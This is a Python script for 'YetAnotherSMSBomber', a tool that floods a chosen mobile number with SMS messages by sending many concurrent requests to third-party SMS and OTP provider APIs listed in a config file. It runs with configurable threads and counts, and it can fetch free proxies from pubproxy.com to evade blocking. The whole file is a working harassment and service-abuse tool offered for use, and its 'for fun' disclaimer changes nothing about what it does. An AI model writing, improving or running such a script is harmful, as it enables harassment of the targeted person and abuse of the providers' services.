#!/usr/bin/env python3

# SPDX-License-Identifier: GPL-3.0-or-later

from concurrent.futures import ThreadPoolExecutor, as_completed
from utils import APIRequestsHandler, CustomArgumentParser
import requests
import random
import time
import sys
from yaml import load

try:
    from yaml import CLoader as Loader
except ImportError:
    from yaml import Loader

# --- ADDED THIS SECTION ---
ascii_art = r"""
 __   __   _        _               _    _
 \ \ / /___ | |_     /_\   _ _   ___ | |_ | |_   ___  _ _
  \ V // -_)|  _|   / _ \ | ' \ / _ \|  _|| ' \ / -_)| '_|
   |_| \___| \__|  /_/ \_\|_||_|\___/ \__||_||_|\___||_|
 ___  __  __  ___   ___               _
/ __||  \/  |/ __|  | _ ) ___  _ __  | |__  ___  _ _
\__ \| |\/| |\__ \  | _ \/ _ \| '  \ | '_ \/ -_)| '_|
|___/|_|  |_||___/  |___/\___/|_|_|_||_.__/\___||_|
"""
# --------------------------

parser = CustomArgumentParser(
    allow_abbrev=False,
    add_help=False,
    description="YetAnotherSMSBomber - A clean, small and powerful SMS bomber script.",
    epilog="Use this for fun, not for revenge or bullying!",
)
parser.add_argument(
    "target",
    metavar="TARGET",
    type=lambda x: (13 >= len(str(int(x))) >= 4)
    and int(x)
    or parser.error('"%s" is an invalid mobile number!' % int(x)),
    help="Target mobile number without country code.",
)
parser.add_argument(
    "--config-path",
    "-c",
    default="services.yaml",
    help="Path to API services file.",
)
parser.add_argument(
    "--num", "-N", type=int, help="Number of SMSs to send.", default=30
)
parser.add_argument(
    "--country",
    "-C",
    type=int,
    help="Country code without (+) sign.",
    default=91,
)
parser.add_argument(
    "--threads",
    "-T",
    type=int,
    help="Max concurrent requests.",
    default=15,
)
parser.add_argument(
    "--timeout",
    "-t",
    type=int,
    help="Request timeout.",
    default=10,
)
parser.add_argument(
    "--proxy",
    "-P",
    action="store_true",
    help="Use proxy for bombing.",
)
parser.add_argument(
    "--verbose",
    "-v",
    action="store_true",
    help="Enables verbose output.",
)
parser.add_argument(
    "--verify",
    "-V",
    action="store_true",
    help="Verify providers.",
)
parser.add_argument("-h", "--help", action="help", help="Display help.")

args = parser.parse_args()

# config loading
config_path = args.config_path
target = str(args.target)
country_code = str(args.country)
no_of_threads = args.threads
no_of_sms = args.num
failed, success = 0, 0

print(ascii_art) # Now this will work!

if not args.verbose and not args.verify:
    print(f"Target: {target} | Threads: {no_of_threads} | SMS-Bombs: {no_of_sms}")

# proxy setup
def get_proxy():
    try:
        curl = requests.get("http://pubproxy.com/api/proxy?format=txt", timeout=5).text
        if "http://pubproxy.com/#premium" in curl:
            return None
        return {"http": curl, "https": curl}
    except:
        return None

proxies = get_proxy() if args.proxy else None

# threadsssss
start = time.time()
with open(config_path, "r") as f:
    providers = load(f, Loader=Loader)["providers"]

if args.verify:
    pall = [p for x in providers.values() for p in x]
    print(f"Processing {len(pall)} providers, please wait!\n")
    with ThreadPoolExecutor(max_workers=len(pall)) as executor:
        jobs = [executor.submit(APIRequestsHandler(target, proxy=proxies, verbose=args.verbose, verify=True, timeout=args.timeout, cc=country_code, config=p).start) for p in pall]
        for job in as_completed(jobs):
            if job.result(): success += 1
            else: failed += 1
else:
    while success < no_of_sms:
        with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
            jobs = []
            for _ in range(no_of_sms - success):
                p = APIRequestsHandler(
                    target,
                    proxy=proxies,
                    verbose=args.verbose,
                    timeout=args.timeout,
                    cc=country_code,
                    config=random.choice(providers[country_code] + providers["multi"] if country_code in providers else providers["multi"]),
                )
                jobs.append(executor.submit(p.start))
            for job in as_completed(jobs):
                if job.result():
                    success += 1
                else:
                    failed += 1
                if not args.verbose:
                    print(f"Requests: {success+failed} | Success: {success} | Failed: {failed}", end="\r")

end = time.time()
print(f"\nTook {end-start:.2f}s to complete")